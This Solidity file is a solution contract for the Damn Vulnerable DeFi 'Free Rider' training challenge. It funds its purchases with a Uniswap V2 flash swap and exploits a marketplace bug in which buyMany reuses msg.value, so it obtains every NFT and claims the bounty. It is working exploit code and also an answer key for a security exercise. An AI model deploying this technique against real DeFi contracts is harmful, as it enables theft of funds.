// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

/**
 * @title FlashSwapRefactored
 * @notice Optimized flash loan contract for exploiting FreeRider NFT marketplace vulnerability
 * @dev This contract uses Uniswap V2 flash swaps to acquire NFTs and claim bounty rewards
 */
contract FlashSwapRefactored is IUniswapV2Callee, IERC721Receiver {
    /*//////////////////////////////////////////////////////////////
                                 ERRORS
    //////////////////////////////////////////////////////////////*/

    error UnauthorizedCaller();
    error InsufficientBalance();
    error TransferFailed();

    /*//////////////////////////////////////////////////////////////
                                CONSTANTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Number of NFTs to acquire
    uint256 private constant NFT_COUNT = 6;
    /// @notice Flash loan amount needed (15 ETH)
    uint256 private constant FLASH_LOAN_AMOUNT = 15 ether;
    /// @notice Uniswap V2 fee numerator
    uint256 private constant FEE_NUMERATOR = 3;
    /// @notice Uniswap V2 fee denominator
    uint256 private constant FEE_DENOMINATOR = 997;

    /*//////////////////////////////////////////////////////////////
                            IMMUTABLE STORAGE
    //////////////////////////////////////////////////////////////*/

    /// @notice Uniswap V2 pair for flash swaps
    IUniswapV2Pair private immutable UNISWAP_PAIR;
    /// @notice WETH token contract
    WETH private immutable WETH_TOKEN;
    /// @notice NFT marketplace contract
    FreeRiderNFTMarketplace private immutable MARKETPLACE;
    /// @notice Recovery manager for bounty claims
    FreeRiderRecoveryManager private immutable RECOVERY_MANAGER;
    /// @notice Player address (beneficiary)
    address private immutable PLAYER;

    /*//////////////////////////////////////////////////////////////
                                MODIFIERS
    //////////////////////////////////////////////////////////////*/

    /// @notice Ensures only the Uniswap pair can call flash swap callback
    modifier onlyUniswapPair() {
        if (msg.sender != address(UNISWAP_PAIR)) revert UnauthorizedCaller();
        _;
    }

    /// @notice Ensures only the player can initiate operations
    modifier onlyPlayer() {
        if (msg.sender != PLAYER) revert UnauthorizedCaller();
        _;
    }

    /*//////////////////////////////////////////////////////////////
                               CONSTRUCTOR
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Initialize the flash swap contract
     * @param _uniswapPair Address of the Uniswap V2 pair
     * @param _weth Address of the WETH contract
     * @param _marketplace Address of the NFT marketplace
     * @param _recoveryManager Address of the recovery manager
     */
    constructor(
        address _uniswapPair,
        address payable _weth,
        address _marketplace,
        address _recoveryManager
    ) payable {
        UNISWAP_PAIR = IUniswapV2Pair(_uniswapPair);
        WETH_TOKEN = WETH(_weth);
        MARKETPLACE = FreeRiderNFTMarketplace(payable(_marketplace));
        RECOVERY_MANAGER = FreeRiderRecoveryManager(payable(_recoveryManager));
        PLAYER = msg.sender;

        // Convert initial ETH to WETH and approve pair
        if (msg.value > 0) {
            WETH_TOKEN.deposit{value: msg.value}();
            WETH_TOKEN.approve(address(UNISWAP_PAIR), type(uint256).max);
        }
    }

    /*//////////////////////////////////////////////////////////////
                            EXTERNAL FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Execute the NFT rescue operation using flash swap
     * @dev Can only be called by the player
     */
    function executeRescue() external onlyPlayer {
        bytes memory data = abi.encode(address(this));

        UNISWAP_PAIR.swap(FLASH_LOAN_AMOUNT, 0, address(this), data);
    }

    /**
     * @notice Uniswap V2 flash swap callback
     * @param amount0 Amount of token0 received
     */
    function uniswapV2Call(
        address, // sender - unused
        uint256 amount0,
        uint256, // amount1 - unused
        bytes calldata
    ) external override onlyUniswapPair {
        // Execute the main rescue logic
        _executeRescueLogic(amount0);

        // Repay the flash loan
        _repayFlashLoan(amount0);

        // Return remaining funds to player
        _returnFundsToPlayer();
    }

    /**
     * @notice Handle ERC721 token receipts
     */
    function onERC721Received(
        address, // operator - unused
        address, // from - unused
        uint256, // tokenId - unused
        bytes calldata // data - unused
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    /**
     * @notice Receive ETH payments
     */
    receive() external payable {}

    /*//////////////////////////////////////////////////////////////
                            INTERNAL FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Execute the main rescue logic
     * @param flashLoanAmount Amount borrowed from flash loan
     */
    function _executeRescueLogic(uint256 flashLoanAmount) internal {
        // Convert WETH to ETH for marketplace interaction
        WETH_TOKEN.withdraw(flashLoanAmount);

        // Purchase all NFTs from marketplace
        _purchaseAllNFTs(flashLoanAmount);

        // Transfer NFTs to recovery manager for bounty
        _transferNFTsForBounty();
    }

    /**
     * @notice Purchase all NFTs from the marketplace
     * @param ethAmount Amount of ETH available for purchases
     */
    function _purchaseAllNFTs(uint256 ethAmount) internal {
        // Build array of token IDs to purchase
        uint256[] memory tokenIds = _buildTokenIdArray();

        // Exploit: buyMany reuses msg.value for each NFT purchase, so we can use the same msg.value for each NFT purchase
        MARKETPLACE.buyMany{value: ethAmount}(tokenIds);
    }

    /**
     * @notice Transfer all acquired NFTs to recovery manager for bounty claim
     */
    function _transferNFTsForBounty() internal {
        DamnValuableNFT nftToken = MARKETPLACE.token();

        bytes memory playerData = abi.encode(PLAYER);

        // Transfer all NFTs to recovery manager
        for (uint256 i; i < NFT_COUNT; ) {
            nftToken.safeTransferFrom(
                address(this),
                address(RECOVERY_MANAGER),
                i,
                playerData
            );

            unchecked {
                ++i;
            }
        }
    }

    /**
     * @notice Calculate and repay the flash loan with fees
     * @param borrowedAmount Original amount borrowed
     */
    function _repayFlashLoan(uint256 borrowedAmount) internal {
        // Calculate Uniswap V2 fee: (amount * 3) / 997 + 1
        uint256 fee = (borrowedAmount * FEE_NUMERATOR) / FEE_DENOMINATOR + 1;
        uint256 repaymentAmount = borrowedAmount + fee;

        // Convert ETH to WETH for repayment
        uint256 currentBalance = address(this).balance;

        WETH_TOKEN.deposit{value: currentBalance}();

        // Verify sufficient balance for repayment
        if (WETH_TOKEN.balanceOf(address(this)) < repaymentAmount) {
            revert InsufficientBalance();
        }

        // Transfer repayment to Uniswap pair
        bool success = WETH_TOKEN.transfer(
            address(UNISWAP_PAIR),
            repaymentAmount
        );

        if (!success) revert TransferFailed();
    }

    /**
     * @notice Return any remaining funds to the player
     */
    function _returnFundsToPlayer() internal {
        // Convert remaining WETH to ETH
        uint256 wethBalance = WETH_TOKEN.balanceOf(address(this));

        WETH_TOKEN.withdraw(wethBalance);

        // Transfer all ETH to player
        uint256 ethBalance = address(this).balance;

        (bool success, ) = PLAYER.call{value: ethBalance}("");
        if (!success) revert TransferFailed();
    }

    /**
     * @notice Build array of token IDs [0, 1, 2, 3, 4, 5]
     * @return tokenIds Array of sequential token IDs
     */
    function _buildTokenIdArray()
        internal
        pure
        returns (uint256[] memory tokenIds)
    {
        tokenIds = new uint256[](NFT_COUNT);

        for (uint256 i; i < NFT_COUNT; ) {
            tokenIds[i] = i;
            unchecked {
                ++i;
            }
        }
    }
}
